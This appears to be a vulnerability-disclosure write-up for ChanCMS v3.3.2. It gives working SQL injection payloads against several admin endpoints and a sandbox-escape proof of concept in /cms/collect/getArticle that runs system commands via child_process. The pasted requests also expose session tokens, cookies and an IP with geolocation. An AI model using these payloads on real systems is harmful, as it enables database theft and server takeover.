---
title: ChanCMSv3.3.2
---

*Author：Narcher*	*Date：2025/10/5*	*Category：Vulnerability Discovery*

<!--more-->

> Project Source Code: [ChanCMS: ChanCMS is a high-quality and practical CMS system developed based on Node, Express 5, MySQL, and Vue 3. Lightweight, flexible, stable, high-performance, and easily extensible, it makes development simpler.](https://gitee.com/chancms/ChanCMS)
>
> Project Version: v3.3.2

### /cms/article/findField

After downloading the source code, deploy it directly and log in to the admin panel at `/public/admin/index.html` using the weak credentials `chancms/123456`.

Code auditing reveals that the `findField` function in `/cms/article/findField?cid=8` does not validate the input parameters.

<img src="ChanCMSv3.3.2/image-20251005195854334.png" alt="image-20251005195854334" style="zoom:50%;" />

<img src="ChanCMSv3.3.2/image-20251005195950511.png" alt="image-20251005195950511" style="zoom:50%;" />

By modifying the `cid` parameter, SQL injection can be performed:

<img src="ChanCMSv3.3.2/image-20251005203317104.png" alt="image-20251005203317104" style="zoom:50%;" />

<img src="ChanCMSv3.3.2/image-20251005200056475.png" alt="image-20251005200056475" style="zoom:50%;" />

Directly modifying the URL requires adding a token, which is obtained after logging in as **chancms**.
 The contents of `d.txt` are as follows:

```
GET /cms/article/findField?cid=1 HTTP/1.1
Host: 192.168.58.128:3000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjE0LCJ1c2VybmFtZSI6ImNoYW5jbXMiLCJmIjoiODUyN2JlNzZiYmVhNTI4ODNkNzkzZjk1MDM1Y2YyZTUiLCJpIjoiMjE4LjE5NC40Mi4xMzYiLCJpYXQiOjE3NTk2NTgwNTAsImV4cCI6MTc1OTc0NDQ1MH0.TUAhZOpCwbRrLIm47WHbfneK-lomsez0IJT9LwPgqIM
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: _f=8527be76bbea52883d793f95035cf2e5; pos={%22ip%22:%22218.194.42.136%22%2C%22country%22:%22%E4%B8%AD%E5%9B%BD%22%2C%22prov%22:%22%E5%9B%9B%E5%B7%9D%22%2C%22city%22:%22%E6%88%90%E9%83%BD%22%2C%22isp%22:%22CERNET%22%2C%22lat%22:30.5723%2C%22lng%22:104.067%2C%22district%22:%22610000%22}; _i=218.194.42.136; t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjE0LCJ1c2VybmFtZSI6ImNoYW5jbXMiLCJmIjoiODUyN2JlNzZiYmVhNTI4ODNkNzkzZjk1MDM1Y2YyZTUiLCJpIjoiMjE4LjE5NC40Mi4xMzYiLCJpYXQiOjE3NTk2NTgwNTAsImV4cCI6MTc1OTc0NDQ1MH0.TUAhZOpCwbRrLIm47WHbfneK-lomsez0IJT9LwPgqIM; n=chancms; perms=api.site.query%2Capi.category.list%2Capi:category:add%2Capi:category.edit%2Capi:article:list%2Capi:article.add%2Capi:article:edit%2Capi:slide:list%2Capi:slide:add%2Capi:slide.edit%2Capi:tag:list%2Capi:tag:add%2Capi:tag:edit%2Capi:tag:list%2Capi:tag:add%2Capi:tag:edit%2Capi:collect:list%2Capi:collect:add%2Capi:collect:edit%2Capi:gather:index%2Capi:gather:add%2Capi:gather:eidt%2Capi:model:list%2Capi:model:add%2Capi:model:edit%2Capi:field:list%2Capi:field:add%2Capi:field:edit%2Capi:friendlink:list%2Capi:friendlink:add%2Capi:friendlink:edit%2Capi:message:list%2Capi:message:add%2Capi:message:edit%2Capi:user:list%2Capi:user:add%2Capi:user:edit%2Capi:role:list%2Capi:role:add%2Capi:role:edit%2Capi:menu:list%2Capi:menu:list%2Capi:configtype:list%2Capi:config:list%2Capi:resource:all%2Capi:template:list%2Capi:upload:list
Connection: keep-alive
```

When running locally you can see a WAF is present, but it failed to block the payload:
 `/cms/article/findField?cid=1+AND+(SELECT+1103+FROM+(SELECT(SLEEP(5)))vbUE)`

<img src="ChanCMSv3.3.2/image-20251005200453009.png" alt="image-20251005200453009" style="zoom:50%;" />

The SQL injection is successful.



### /cms/article/update

Log in to the admin panel at `/public/admin/index.html` using the weak credentials `chancms/123456`.

Code auditing revealed that the `update` function in `/cms/article/update` does not validate the `cid` parameter.

<img src="ChanCMSv3.3.2/image-20251005201715297.png" alt="image-20251005201715297" style="zoom:50%;" />

```
[Vuln: sqldet]
Target           "http://192.168.58.128:3000/cms/article/update"
VulnType         "blind-based/default"
Payload          "(select*from(select+sleep(2)union/**/select+1)a)"
Position         "body"
ParamKey         "id"
ParamValue       "(select*from(select+sleep(2)union/**/select+1)a)"
sleep_time       "2000"
p_time           "11"
n_time           "4013"
stat             "{\"normal\":{\"samples\":[107,112,88,75,58,56],\"avg\":82.66666666666667,\"std_dev\":21.830152440043918,\"sleep_time\":2},\"sleep_0_time\":11,\"quick_check\":{\"samples\":[4013],\"sleep\":2},\"verify\":{\"samples\":[6013,6012,6011],\"sleep\":3}}"
title            "Generic MySQL time based case [number/column]"
type             "time_based"
avg_time         "82"
std_dev          "21"
```

<img src="ChanCMSv3.3.2/image-20251006123321111.png" alt="image-20251006123321111" style="zoom: 33%;" />

 The contents of `d.txt` are as follows:

```
POST /cms/article/update HTTP/1.1
Host: 192.168.58.128:3000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjE0LCJ1c2VybmFtZSI6ImNoYW5jbXMiLCJmIjoiODUyN2JlNzZiYmVhNTI4ODNkNzkzZjk1MDM1Y2YyZTUiLCJpIjoiMjE4LjE5NC40Mi4xMzYiLCJpYXQiOjE3NTk3MjQ4NDgsImV4cCI6MTc1OTgxMTI0OH0.9PY83sb3PNmXkGHggc0SqMffRmb6gXWc8vobB4GhMzw
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: _f=8527be76bbea52883d793f95035cf2e5; pos={%22ip%22:%22218.194.42.136%22%2C%22country%22:%22%E4%B8%AD%E5%9B%BD%22%2C%22prov%22:%22%E5%9B%9B%E5%B7%9D%22%2C%22city%22:%22%E6%88%90%E9%83%BD%22%2C%22isp%22:%22CERNET%22%2C%22lat%22:30.5723%2C%22lng%22:104.067%2C%22district%22:%22610000%22}; _i=218.194.42.136; n=chancms; perms=api.site.query%2Capi.category.list%2Capi:category:add%2Capi:category.edit%2Capi:article:list%2Capi:article.add%2Capi:article:edit%2Capi:slide:list%2Capi:slide:add%2Capi:slide.edit%2Capi:tag:list%2Capi:tag:add%2Capi:tag:edit%2Capi:tag:list%2Capi:tag:add%2Capi:tag:edit%2Capi:collect:list%2Capi:collect:add%2Capi:collect:edit%2Capi:gather:index%2Capi:gather:add%2Capi:gather:eidt%2Capi:model:list%2Capi:model:add%2Capi:model:edit%2Capi:field:list%2Capi:field:add%2Capi:field:edit%2Capi:friendlink:list%2Capi:friendlink:add%2Capi:friendlink:edit%2Capi:message:list%2Capi:message:add%2Capi:message:edit%2Capi:user:list%2Capi:user:add%2Capi:user:edit%2Capi:role:list%2Capi:role:add%2Capi:role:edit%2Capi:menu:list%2Capi:menu:list%2Capi:configtype:list%2Capi:config:list%2Capi:resource:all%2Capi:template:list%2Capi:upload:list; t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjE0LCJ1c2VybmFtZSI6ImNoYW5jbXMiLCJmIjoiODUyN2JlNzZiYmVhNTI4ODNkNzkzZjk1MDM1Y2YyZTUiLCJpIjoiMjE4LjE5NC40Mi4xMzYiLCJpYXQiOjE3NTk3MjQ4NDgsImV4cCI6MTc1OTgxMTI0OH0.9PY83sb3PNmXkGHggc0SqMffRmb6gXWc8vobB4GhMzw
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

cid=111111
```



### /cms/collect/getArticle

Although the `getArticle` function in `app/modules/cms/controller/collect.js` uses `app/middleware/guard.js` as a WAF to intercept requests, the WAF is incomplete and can be bypassed.

<img src="ChanCMSv3.3.2/image-20251006161304637.png" alt="image-20251006161304637" style="zoom:50%;" />

<img src="ChanCMSv3.3.2/image-20251006161531724.png" alt="image-20251006161531724" style="zoom:50%;" />

First, log in to the admin panel at `/public/admin/index.html` using the weak credentials `chancms/123456`:

<img src="ChanCMSv3.3.2/image-20251006161659610.png" alt="image-20251006161659610" style="zoom: 33%;" />

POC:

```
POST /cms/collect/getArticle HTTP/1.1
Host: 192.168.58.128:3000
Content-Length: 301
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0
Accept: application/json, text/plain, */*
Content-Type: application/json; charset=UTF-8
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjE0LCJ1c2VybmFtZSI6ImNoYW5jbXMiLCJmIjoiODUyN2JlNzZiYmVhNTI4ODNkNzkzZjk1MDM1Y2YyZTUiLCJpIjoiMjE4LjE5NC40Mi4xMzYiLCJpYXQiOjE3NTk3MzIxNjMsImV4cCI6MTc1OTgxODU2M30.urN857ZVdmYALnKilKjCQUKQreHxLvibEcK1gHrMnWE
Origin: http://192.168.58.128:3000
Referer: http://192.168.58.128:3000/public/admin/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: _f=8527be76bbea52883d793f95035cf2e5; pos={%22ip%22:%22218.194.42.136%22%2C%22country%22:%22%E4%B8%AD%E5%9B%BD%22%2C%22prov%22:%22%E5%9B%9B%E5%B7%9D%22%2C%22city%22:%22%E6%88%90%E9%83%BD%22%2C%22isp%22:%22CERNET%22%2C%22lat%22:30.5723%2C%22lng%22:104.067%2C%22district%22:%22610000%22}; _i=218.194.42.136; t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjE0LCJ1c2VybmFtZSI6ImNoYW5jbXMiLCJmIjoiODUyN2JlNzZiYmVhNTI4ODNkNzkzZjk1MDM1Y2YyZTUiLCJpIjoiMjE4LjE5NC40Mi4xMzYiLCJpYXQiOjE3NTk3MzIxNjMsImV4cCI6MTc1OTgxODU2M30.urN857ZVdmYALnKilKjCQUKQreHxLvibEcK1gHrMnWE; n=chancms; perms=api.site.query%2Capi.category.list%2Capi:category:add%2Capi:category.edit%2Capi:article:list%2Capi:article.add%2Capi:article:edit%2Capi:slide:list%2Capi:slide:add%2Capi:slide.edit%2Capi:tag:list%2Capi:tag:add%2Capi:tag:edit%2Capi:tag:list%2Capi:tag:add%2Capi:tag:edit%2Capi:collect:list%2Capi:collect:add%2Capi:collect:edit%2Capi:gather:index%2Capi:gather:add%2Capi:gather:eidt%2Capi:model:list%2Capi:model:add%2Capi:model:edit%2Capi:field:list%2Capi:field:add%2Capi:field:edit%2Capi:friendlink:list%2Capi:friendlink:add%2Capi:friendlink:edit%2Capi:message:list%2Capi:message:add%2Capi:message:edit%2Capi:user:list%2Capi:user:add%2Capi:user:edit%2Capi:role:list%2Capi:role:add%2Capi:role:edit%2Capi:menu:list%2Capi:menu:list%2Capi:configtype:list%2Capi:config:list%2Capi:resource:all%2Capi:template:list%2Capi:upload:list
Connection: keep-alive

{"taskUrl":"http://opinion.people.com.cn/n1/2025/1006/c1003-40577077.html","titleTag":"#newstit","articleTag":".rm_txt_con","parseData":"return (p => p.getBuiltinModule('child_process').spawnSync('whoami', [], {}).output[1].toString())(this.constructor.constructor('return process')())","charset":"1"}
```

<img src="ChanCMSv3.3.2/image-20251006161752136.png" alt="image-20251006161752136" style="zoom:50%;" />

Allows direct command execution.

If the target Node.js is an older version, the following POC can be used:

```
return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
```



### /cms/model/hasUse

Log in to the admin panel at `/public/admin/index.html` using the weak credentials `chancms/123456`.

Code auditing revealed that the `hasUse` function in `/cms/model/hasUse?id=1` does not validate the `id` parameter.

<img src="ChanCMSv3.3.2/image-20251006170206614.png" alt="image-20251006170206614" style="zoom:67%;" />

<img src="ChanCMSv3.3.2/image-20251006200453286.png" alt="image-20251006200453286" style="zoom:50%;" />

<img src="ChanCMSv3.3.2/image-20251006200511107.png" alt="image-20251006200511107" style="zoom:50%;" />

